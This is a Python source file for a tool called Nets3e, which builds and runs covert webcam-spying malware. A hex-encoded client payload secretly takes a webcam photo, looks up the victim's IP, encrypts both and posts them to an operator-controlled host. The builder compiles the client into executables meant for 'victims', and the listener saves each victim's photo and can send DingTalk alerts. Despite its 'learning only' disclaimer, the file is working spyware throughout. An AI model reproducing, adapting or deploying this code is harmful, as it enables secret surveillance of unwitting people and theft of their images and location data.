#!/usr/bin/python3
# @Мартин.
import asyncio,re,base64,json,sys,textwrap,argparse,subprocess,socket,hashlib,time
from Crypto.Cipher import AES
from loguru import logger
from io import BytesIO
from PIL import Image
from pack.DingTalkPush import DingTalk

version = "@Мартин. Nets3e Tool V1.1.3 for Windows"
title = '''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
logo = f'''                                                                    
         ,--.                                 .--,-``-.               
       ,--.'|              ___               /   /     '.             
   ,--,:  : |            ,--.'|_            / ../        ;            
,`--.'`|  ' :            |  | :,'           \ ``\  .`-    '           
|   :  :  | |            :  : ' :  .--.--.   \___\/   \   :           
:   |   \ | :   ,---.  .;__,'  /  /  /    '       \   :   |   ,---.   
|   : '  '; |  /     \ |  |   |  |  :  /`./       /  /   /   /     \  
'   ' ;.    ; /    /  |:__,'| :  |  :  ;_         \  \   \  /    /  | 
|   | | \   |.    ' / |  '  : |__ \  \    `.  ___ /   :   |.    ' / | 
'   : |  ; .''   ;   /|  |  | '.'| `----.   \/   /\   /   :'   ;   /| 
|   | '`--'  '   |  / |  ;  :    ;/  /`--'  / ,,/  ',-    .'   |  / | 
'   : |      |   :    |  |  ,   /'--'.     /\ ''\        ; |   :    | 
;   |.'       \   \  /    ---`-'   `--'---'  \   \     .'   \   \  /  
'---'          `----'                         `--`-,,-'      `----'   
                                                                       
                Github==>https://github.com/MartinxMax
                {version}'''

def init_loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


def myip():
    return socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)[0][4][0]


class MainServer():
    def __init__(self,args):
        if self.__checkValue__(args):
            asyncio.run(self.__run__())


    def __generatePayload__(self):
        result_release = True
        method,pbip=self.__load_ip_conf()
        payload_debug = self.__bytescode__.decode('utf-8').replace('@remote',base64.b64encode((f'http://{self.lhost}:{self.lport}').encode("utf-8")).decode('utf-8'))
        payload_debug = payload_debug.replace('@METHOD', method.lower())
        payload_debug = payload_debug.replace('@GETIP', base64.b64encode((pbip).encode("utf-8")).decode('utf-8'))
        payload_debug = payload_debug.replace('@SALT',self.__salt).encode('utf-8')
        try:
            if self.rhost:
                payload_release = self.__bytescode__.decode('utf-8').replace('@remote', base64.b64encode(
                    self.rhost.encode("utf-8")).decode('utf-8'))
                payload_release = payload_release.replace('@METHOD',method.lower())
                payload_release = payload_release.replace('@GETIP',
                                                      base64.b64encode((pbip).encode("utf-8")).decode('utf-8'))
                payload_release = payload_release.replace('@SALT', self.__salt).encode('utf-8')
                with open('./temp_release.py', 'wb') as f:
                    f.write(payload_release)
            with open('./temp_debug.py', 'wb') as f:
                f.write(payload_debug)
        except Exception as e:
            print(e)
            pass
        else:
            logger.warning('Generating debug version (you can send this version to intranet victims)')
            result_debug = subprocess.call(f'pyinstaller -F ./temp_debug.py -n Nets3eClient_debug', shell=True,
                                           stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
            if self.rhost:
                logger.warning('Generating a release version (you can send it to public network victims)')
                result_release = subprocess.call(f'pyinstaller -F ./temp_release.py -n Nets3eClient_release', shell=True, stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)
            if not result_debug :
                if not result_release:
                    subprocess.call('del "./temp_release.py"', shell=True, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                subprocess.call('del "./temp_debug.py"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            else:
                logger.error('You can enter \'pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller\' to download the package')
                return False

    def __load_ip_conf(self):
        with open('./GETIP.conf','r',encoding='utf-8')as f:
                ip = json.loads(f.read())
        if not ip['METHOD'] and not ip['GETIP']:
            raise ValueError("Unable to obtain configuration file content (GETIP. conf)")
        else:
            return ip['METHOD'],ip['GETIP']

    def __load_dingtalk_conf(self):
            with open('./DingTalk.conf','r',encoding='utf-8')as f:
                conf = json.loads(f.read())
            if not conf['TOKEN'] and not conf['SECRET']:
                raise ValueError("Unable to obtain configuration file content (DingTalk. conf)")
            else:
                return conf['TOKEN'],conf['SECRET']

    def __checkValue__(self,args):
        if not re.match(r'(?P<protocol>\w+):\/\/(?P<hostname>[\w\.]+)(:(?P<port>\d+))?\/?', args.RHOST) and args.RHOST:
            logger.error('\'-rh\' The remote address you entered is incorrect ! (example: http://xxx.xxx.xxx.xxx:10032)')
            return False
        elif not isinstance(args.LPORT, int):
            logger.error('\'-lp\' The local listening port number you entered is not an integer!')
            return False
        elif not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', args.LHOST):
            logger.error('\'-lh\' Incorrect local listening IP input ! (example: 192.x.x.x)')
            return False
        else:
            self.dingtalk = ''
            self.generate = args.GENERATE
            self.lport = args.LPORT
            self.lhost = args.LHOST
            self.rhost = args.RHOST
            self.__bytescode__ = b'\x69\x6D\x70\x6F\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x2C\x63\x76\x32\x2C\x62\x61\x73\x65\x36\x34\x2C\x6A\x73\x6F\x6E\x2C\x68\x61\x73\x68\x6C\x69\x62\x0A\x66\x72\x6F\x6D\x20\x43\x72\x79\x70\x74\x6F\x2E\x43\x69\x70\x68\x65\x72\x20\x69\x6D\x70\x6F\x72\x74\x20\x41\x45\x53\x0A\x0A\x64\x65\x66\x20\x67\x65\x74\x5F\x69\x70\x28\x29\x3A\x20\x72\x65\x74\x75\x72\x6E\x20\x72\x65\x71\x75\x65\x73\x74\x73\x2E\x40\x4D\x45\x54\x48\x4F\x44\x28\x62\x61\x73\x65\x36\x34\x2E\x62\x36\x34\x64\x65\x63\x6F\x64\x65\x28\x27\x40\x47\x45\x54\x49\x50\x27\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x29\x2C\x20\x68\x65\x61\x64\x65\x72\x73\x3D\x7B\x27\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74\x27\x3A\x20\x27\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x27\x7D\x2C\x20\x74\x69\x6D\x65\x6F\x75\x74\x3D\x35\x29\x2E\x74\x65\x78\x74\x2E\x73\x74\x72\x69\x70\x28\x29\x20\x69\x66\x20\x72\x65\x71\x75\x65\x73\x74\x73\x2E\x40\x4D\x45\x54\x48\x4F\x44\x28\x62\x61\x73\x65\x36\x34\x2E\x62\x36\x34\x64\x65\x63\x6F\x64\x65\x28\x27\x40\x47\x45\x54\x49\x50\x27\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x29\x2C\x20\x68\x65\x61\x64\x65\x72\x73\x3D\x7B\x27\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74\x27\x3A\x20\x27\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x27\x7D\x2C\x20\x74\x69\x6D\x65\x6F\x75\x74\x3D\x35\x29\x2E\x74\x65\x78\x74\x2E\x73\x74\x72\x69\x70\x28\x29\x20\x65\x6C\x73\x65\x20\x4E\x6F\x6E\x65\x0A\x64\x65\x66\x20\x74\x61\x6B\x65\x5F\x70\x68\x6F\x74\x6F\x28\x29\x3A\x0A\x20\x20\x20\x20\x63\x61\x6D\x65\x72\x61\x5F\x64\x65\x76\x69\x63\x65\x20\x3D\x20\x30\x0A\x20\x20\x20\x20\x63\x61\x70\x20\x3D\x20\x63\x76\x32\x2E\x56\x69\x64\x65\x6F\x43\x61\x70\x74\x75\x72\x65\x28\x63\x61\x6D\x65\x72\x61\x5F\x64\x65\x76\x69\x63\x65\x29\x0A\x20\x20\x20\x20\x69\x66\x20\x6E\x6F\x74\x20\x63\x61\x70\x2E\x69\x73\x4F\x70\x65\x6E\x65\x64\x28\x29\x3A\x20\x72\x65\x74\x75\x72\x6E\x20\x27\x27\x0A\x20\x20\x20\x20\x5F\x2C\x20\x66\x72\x61\x6D\x65\x20\x3D\x20\x63\x61\x70\x2E\x72\x65\x61\x64\x28\x29\x0A\x20\x20\x20\x20\x5F\x2C\x20\x62\x75\x66\x66\x65\x72\x20\x3D\x20\x63\x76\x32\x2E\x69\x6D\x65\x6E\x63\x6F\x64\x65\x28\x27\x2E\x6A\x70\x67\x27\x2C\x20\x66\x72\x61\x6D\x65\x29\x0A\x20\x20\x20\x20\x6A\x70\x67\x5F\x61\x73\x5F\x74\x65\x78\x74\x20\x3D\x20\x62\x61\x73\x65\x36\x34\x2E\x62\x36\x34\x65\x6E\x63\x6F\x64\x65\x28\x62\x75\x66\x66\x65\x72\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x27\x75\x74\x66\x2D\x38\x27\x29\x0A\x20\x20\x20\x20\x63\x61\x70\x2E\x72\x65\x6C\x65\x61\x73\x65\x28\x29\x3B\x63\x76\x32\x2E\x64\x65\x73\x74\x72\x6F\x79\x41\x6C\x6C\x57\x69\x6E\x64\x6F\x77\x73\x28\x29\x3B\x72\x65\x74\x75\x72\x6E\x20\x27\x64\x61\x74\x61\x3A\x69\x6D\x61\x67\x65\x2F\x70\x6E\x67\x3B\x62\x61\x73\x65\x36\x34\x2C\x27\x20\x2B\x20\x6A\x70\x67\x5F\x61\x73\x5F\x74\x65\x78\x74\x0A\x64\x65\x66\x20\x72\x65\x6D\x6F\x74\x65\x5F\x73\x65\x72\x76\x65\x72\x28\x64\x61\x74\x61\x29\x3A\x0A\x20\x20\x20\x20\x74\x72\x79\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x71\x75\x65\x73\x74\x73\x2E\x70\x6F\x73\x74\x28\x62\x61\x73\x65\x36\x34\x2E\x62\x36\x34\x64\x65\x63\x6F\x64\x65\x28\x27\x40\x72\x65\x6D\x6F\x74\x65\x27\x29\x2E\x64\x65\x63\x6F\x64\x65\x28\x29\x2C\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x68\x65\x61\x64\x65\x72\x73\x3D\x7B\x27\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74\x27\x3A\x20\x27\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x27\x7D\x2C\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x74\x69\x6D\x65\x6F\x75\x74\x3D\x31\x2C\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x64\x61\x74\x61\x3D\x64\x61\x74\x61\x29\x0A\x20\x20\x20\x20\x65\x78\x63\x65\x70\x74\x3A\x70\x61\x73\x73\x0A\x64\x65\x66\x20\x65\x6E\x63\x72\x79\x70\x74\x5F\x77\x69\x74\x68\x5F\x73\x61\x6C\x74\x28\x70\x6C\x61\x69\x6E\x74\x65\x78\x74\x2C\x70\x61\x73\x73\x77\x6F\x72\x64\x29\x3A\x0A\x20\x20\x20\x20\x73\x61\x6C\x74\x3D\x68\x61\x73\x68\x6C\x69\x62\x2E\x73\x68\x61\x32\x35\x36\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x65\x6E\x63\x6F\x64\x65\x28\x29\x29\x2E\x64\x69\x67\x65\x73\x74\x28\x29\x5B\x3A\x31\x36\x5D\x3B\x6B\x65\x79\x2C\x69\x76\x3D\x64\x65\x72\x69\x76\x65\x5F\x6B\x65\x79\x5F\x61\x6E\x64\x5F\x69\x76\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x65\x6E\x63\x6F\x64\x65\x28\x29\x2C\x73\x61\x6C\x74\x29\x3B\x63\x69\x70\x68\x65\x72\x3D\x41\x45\x53\x2E\x6E\x65\x77\x28\x6B\x65\x79\x2C\x41\x45\x53\x2E\x4D\x4F\x44\x45\x5F\x43\x42\x43\x2C\x69\x76\x29\x3B\x70\x61\x64\x64\x65\x64\x5F\x70\x6C\x61\x69\x6E\x74\x65\x78\x74\x3D\x70\x61\x64\x28\x70\x6C\x61\x69\x6E\x74\x65\x78\x74\x2E\x65\x6E\x63\x6F\x64\x65\x28\x29\x2C\x41\x45\x53\x2E\x62\x6C\x6F\x63\x6B\x5F\x73\x69\x7A\x65\x29\x3B\x72\x65\x74\x75\x72\x6E\x20\x73\x61\x6C\x74\x2B\x63\x69\x70\x68\x65\x72\x2E\x65\x6E\x63\x72\x79\x70\x74\x28\x70\x61\x64\x64\x65\x64\x5F\x70\x6C\x61\x69\x6E\x74\x65\x78\x74\x29\x0A\x64\x65\x66\x20\x64\x65\x63\x72\x79\x70\x74\x5F\x77\x69\x74\x68\x5F\x73\x61\x6C\x74\x28\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74\x2C\x70\x61\x73\x73\x77\x6F\x72\x64\x29\x3A\x0A\x20\x20\x20\x20\x73\x61\x6C\x74\x2C\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74\x3D\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74\x5B\x3A\x31\x36\x5D\x2C\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74\x5B\x31\x36\x3A\x5D\x3B\x6B\x65\x79\x2C\x69\x76\x3D\x64\x65\x72\x69\x76\x65\x5F\x6B\x65\x79\x5F\x61\x6E\x64\x5F\x69\x76\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x65\x6E\x63\x6F\x64\x65\x28\x29\x2C\x73\x61\x6C\x74\x29\x3B\x63\x69\x70\x68\x65\x72\x3D\x41\x45\x53\x2E\x6E\x65\x77\x28\x6B\x65\x79\x2C\x41\x45\x53\x2E\x4D\x4F\x44\x45\x5F\x43\x42\x43\x2C\x69\x76\x29\x3B\x64\x65\x63\x72\x79\x70\x74\x65\x64\x5F\x74\x65\x78\x74\x3D\x63\x69\x70\x68\x65\x72\x2E\x64\x65\x63\x72\x79\x70\x74\x28\x63\x69\x70\x68\x65\x72\x74\x65\x78\x74\x29\x3B\x70\x6C\x61\x69\x6E\x74\x65\x78\x74\x3D\x75\x6E\x70\x61\x64\x28\x64\x65\x63\x72\x79\x70\x74\x65\x64\x5F\x74\x65\x78\x74\x29\x3B\x72\x65\x74\x75\x72\x6E\x20\x70\x6C\x61\x69\x6E\x74\x65\x78\x74\x2E\x64\x65\x63\x6F\x64\x65\x28\x27\x75\x74\x66\x2D\x38\x27\x29\x0A\x64\x65\x66\x20\x70\x61\x64\x28\x73\x2C\x73\x69\x7A\x65\x29\x3A\x70\x61\x64\x64\x69\x6E\x67\x5F\x73\x69\x7A\x65\x3D\x73\x69\x7A\x65\x2D\x6C\x65\x6E\x28\x73\x29\x25\x73\x69\x7A\x65\x3B\x72\x65\x74\x75\x72\x6E\x20\x73\x2B\x62\x79\x74\x65\x73\x28\x5B\x70\x61\x64\x64\x69\x6E\x67\x5F\x73\x69\x7A\x65\x5D\x2A\x70\x61\x64\x64\x69\x6E\x67\x5F\x73\x69\x7A\x65\x29\x0A\x64\x65\x66\x20\x75\x6E\x70\x61\x64\x28\x73\x29\x3A\x70\x61\x64\x64\x69\x6E\x67\x5F\x73\x69\x7A\x65\x3D\x73\x5B\x2D\x31\x5D\x3B\x72\x65\x74\x75\x72\x6E\x20\x73\x5B\x3A\x2D\x70\x61\x64\x64\x69\x6E\x67\x5F\x73\x69\x7A\x65\x5D\x0A\x64\x65\x66\x20\x64\x65\x72\x69\x76\x65\x5F\x6B\x65\x79\x5F\x61\x6E\x64\x5F\x69\x76\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x2C\x73\x61\x6C\x74\x29\x3A\x0A\x20\x20\x20\x20\x64\x3D\x64\x5F\x69\x3D\x62\x27\x27\x0A\x20\x20\x20\x20\x77\x68\x69\x6C\x65\x20\x6C\x65\x6E\x28\x64\x29\x3C\x34\x38\x3A\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x64\x5F\x69\x3D\x68\x61\x73\x68\x6C\x69\x62\x2E\x6D\x64\x35\x28\x64\x5F\x69\x2B\x70\x61\x73\x73\x77\x6F\x72\x64\x2B\x73\x61\x6C\x74\x29\x2E\x64\x69\x67\x65\x73\x74\x28\x29\x3B\x64\x2B\x3D\x64\x5F\x69\x0A\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6E\x20\x64\x5B\x3A\x33\x32\x5D\x2C\x64\x5B\x33\x32\x3A\x34\x38\x5D\x0A\x0A\x69\x66\x20\x5F\x5F\x6E\x61\x6D\x65\x5F\x5F\x3D\x3D\x27\x5F\x5F\x6D\x61\x69\x6E\x5F\x5F\x27\x3A\x0A\x20\x20\x20\x20\x69\x70\x3D\x67\x65\x74\x5F\x69\x70\x28\x29\x0A\x20\x20\x20\x20\x69\x66\x20\x69\x70\x3A\x72\x65\x6D\x6F\x74\x65\x5F\x73\x65\x72\x76\x65\x72\x28\x65\x6E\x63\x72\x79\x70\x74\x5F\x77\x69\x74\x68\x5F\x73\x61\x6C\x74\x28\x6A\x73\x6F\x6E\x2E\x64\x75\x6D\x70\x73\x28\x7B\x27\x49\x50\x27\x3A\x69\x70\x2C\x27\x50\x68\x6F\x74\x6F\x27\x3A\x74\x61\x6B\x65\x5F\x70\x68\x6F\x74\x6F\x28\x29\x7D\x29\x2C\x27\x40\x53\x41\x4C\x54\x27\x29\x29'
            self.__salt = args.SALT
            if args.DINGDING :
                self.dingtalk = DingTalk(False)
                dtoken,dtsecret = self.__load_dingtalk_conf()
                self.dingtalk.set_token(dtoken)
                self.dingtalk.set_secret(dtsecret)
                self.dingtalk.send_text(version+' Runing...')
            return True

    def __saveLog__(self,ip, photo):
        image_data = base64.b64decode(photo.split(',')[-1])
        img = Image.open(BytesIO(image_data))
        img.save(f"./IP_Photo/{ip}.png")
        logger.info(f"The victim {ip} information has been saved! ./IP_Photo/{ip}.png")

    def __unpad(self,s):
        padding_size = s[-1]
        return s[:-padding_size]

    def __derive_key_and_iv(self,password, salt):
        d = d_i = b''
        while len(d) < 48:
            d_i = hashlib.md5(d_i + password + salt).digest()
            d += d_i
        return d[:32], d[32:48]
    
    def __decrypt_with_salt(self,ciphertext, password):
        salt, ciphertext = ciphertext[:16], ciphertext[16:]
        key, iv = self.__derive_key_and_iv(password.encode(), salt)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_text = cipher.decrypt(ciphertext)
        plaintext = self.__unpad(decrypted_text)
        return plaintext.decode('utf-8')

    async def handleClient(self,reader, writer):
        data = b''
        while True:
            message = await reader.read(20480)
            if not message:
                break
            data += message
            await writer.drain()
        writer.close()
        try:
            data = data[data.find(b'\r\n\r\n') + 4:]
            data = self.__decrypt_with_salt(data,self.__salt)
            data = json.loads(data)
        except Exception as f:
            pass
        else:
            if data['IP'] and data['Photo']:
                    self.__saveLog__(data['IP'], data['Photo'])
                    if self.dingtalk:
                        self.dingtalk.send_text('Successfully taken photos on IP:'+data['IP'])

    async def __run__(self):
        if self.generate:
            logger.info('PAYLOAD Build...')
            if self.__generatePayload__():
                logger.info('The PAYLOAD construction was successful, and the directory is located in ./dist/')
            else:
                logger.error('PAYLOAD construction failed!!!')
        server = await asyncio.start_server(self.handleClient, '', self.lport)
        server.sockets[0].getsockname()
        logger.info(f"Server Runing....[IP:{self.lhost}:{self.lport}]")
        async with server:
            await server.serve_forever()


if __name__ == '__main__':
    init_loger()
    print(logo,title)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {nets3e} -lh {ip} -lp 10032 # local listen port
                python3 {nets3e} -rh http://www.xxx.com:9999 -lp 10032 # remote host,local listen port
                python3 {nets3e} -rh http://www.xxx.com:9999 -g # Generate PAYLOAD
                python3 {nets3e} -rh http://www.xxx.com:9999 -g -salt <xxxx> # Transmission of victim information after
                AES encryption to prevent Man-in-the-middle attack  (-salt) Specify the salt, default to the local IP address ({ip})
                python3 {nets3e} -dd # DingTalk Push Message
                '''.format(nets3e=sys.argv[0],ip=myip()
                           )))
    parser.add_argument('-lh', '--LHOST',default=myip(), help='Listen_Port')
    parser.add_argument('-lp', '--LPORT',type=int,default='10032', help='Listen_Port')
    parser.add_argument('-rh', '--RHOST', default='', help='Remote Host')
    parser.add_argument('-g', '--GENERATE', action='store_true', help='Biulding Payload')
    parser.add_argument('-dd', '--DINGDING', action='store_true', help='DingTalk')
    parser.add_argument('-salt', '--SALT', default=myip(), help='AES Salt')
    args = parser.parse_args()
    MainServer(args)